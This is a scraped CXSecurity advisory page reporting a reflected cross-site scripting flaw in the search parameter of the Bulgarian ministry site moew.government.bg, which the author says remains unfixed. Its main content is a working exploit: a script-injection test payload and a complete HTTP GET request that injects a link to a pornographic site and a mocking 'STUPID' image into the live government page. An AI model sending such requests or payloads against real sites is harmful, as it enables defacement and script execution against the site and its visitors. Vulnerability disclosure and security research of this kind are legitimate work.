---
title: moew.government.bg Cross-site scripting (reflected)
url: https://cxsecurity.com/issue/WLB-2025110009
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-11-13
fetch_date: 2025-11-14T03:12:08.094717
---

# moew.government.bg Cross-site scripting (reflected)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **moew.government.bg Cross-site scripting (reflected)**  **2025.11.13**  Credit:  **[nu11secur1ty](https://cxsecurity.com/author/nu11secur1ty/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

## Titles: moew.government.bg Cross-site scripting (reflected)
## Author: nu11secur1ty
## Date: 11/10/2025
## Vendor: https://www.moew.government.bg/
## Software: https://www.moew.government.bg/
## Reference: https://portswigger.net/web-security/cross-site-scripting
## Description:
-NOTE: The target is not RESPONDING after I reported this problem, one year early. WHAT A SHAME!
The value of the query request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload mxrdv"><script>alert(1)</script>zt9br was submitted in the query parameter. This input was echoed unmodified in the application's response.
STATUS: HIGH- Vulnerability
[+]Exploit:
```
GET /bg/search/?query=%3Ca%20href=%22https://www.pornhub.com%22%20target=%22\_blank%22%3E%20%3Cimg%20src=%22https://media1.tenor.com/m/sLjUbG5BVikAAAAd/trump-dance-trump-2024.gif%22%20alt=%22STUPID%22width=%22900%22%20height=%22450%22%3E%20%3C/a%3E&submit=%D0%A2%D1%8A%D1%80%D1%81%D0%B8 HTTP/1.1
Host: www.moew.government.bg
Cookie: \_ga\_7HXZLF4R2C=GS2.1.s1756997385$o1$g1$t1756997784$j59$l0$h0; \_ga=GA1.2.946718660.1756997386
Sec-Ch-Ua: "Not\_A Brand";v="99", "Chromium";v="142"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive
```
## Demo PoC:
[href](https://www.nu11secur1ty.com/2025/11/moewgovernmentbg-xss-reflected.html)
## Time spent:
00:27:00
--
System Administrator - Infrastructure Engineer
Penetration Testing Engineer
Exploit developer at https://packetstormsecurity.com/ https://cve.mitre.org/index.html
https://cxsecurity.com/ and https://www.exploit-db.com/
home page: https://www.asc3t1c-nu11secur1ty.com/
hiPEnIMR0v7QCo/+SEH9gBclAAYWGnPoBIQ75sCj60E=
nu11secur1ty <https://nu11secur1ty.blogspot.com/>

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025110009)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top